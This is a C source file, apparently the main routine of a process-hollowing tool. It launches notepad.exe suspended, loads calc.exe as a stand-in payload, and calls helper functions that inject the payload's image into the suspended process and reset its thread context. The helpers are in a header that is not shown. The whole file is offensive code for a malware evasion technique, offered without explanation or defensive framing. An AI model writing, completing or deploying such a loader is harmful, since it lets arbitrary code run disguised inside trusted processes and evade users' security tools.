#include "box.h"

#define TARGET_PROCESS	"notepad.exe"
#define TEST_EXECUTABLE "C:\\Windows\\System32\\calc.exe"

int main()
{

	HANDLE					hProcess			= NULL,
							hThread				= NULL;
	DWORD					PID					= 0, 
							NumOfBytesToRead	= 0,
							Delta				= 0;
	PIMAGE_NT_HEADERS		pImgNt				= NULL;
	PIMAGE_SECTION_HEADER	pImgSecHeader		= NULL;
	PIMAGE_DATA_DIRECTORY	pImgDataDir			= NULL;

	LPVOID	lpBuffer		= NULL, 
			rBuffer			= NULL, 
			peBaseAddress	= NULL, 
			lpFile			= NULL;


	if (!CreateSuspendedProcess(TARGET_PROCESS, &hProcess, &hThread, &PID))
	{
		PRINT_ERROR("CreateSuspendedProcess");
		return 1;
	}

	if (!ReadTargetFile(TEST_EXECUTABLE, &lpBuffer, &NumOfBytesToRead))
	{
		PRINT_ERROR("ReadTargetFile");
		return 1;
	}

	if (!GrabPeHeader(&pImgNt, &pImgSecHeader, &pImgDataDir, lpBuffer))
	{
		PRINT_ERROR("GrabPeHeader");
		return 1;
	}

	if (!HollowExec(hProcess, pImgNt, &rBuffer, peBaseAddress, pImgSecHeader, pImgDataDir, lpBuffer, &Delta))
	{
		PRINT_ERROR("HollowExec");
		return 1;
	}

	if (!GetThreadCtx(hProcess, hThread, pImgNt, rBuffer))
	{
		PRINT_ERROR("GetThreadCtx");
		return 1;
	}

	CHAR("Cleanup...");
	getchar();

	if (hProcess)
		CloseHandle(hProcess);

	if (hThread)
		CloseHandle(hThread);

	if (rBuffer)
		VirtualFree(rBuffer, 0, MEM_RELEASE);

	CHAR("Quit...");
	getchar();

	return 0;

}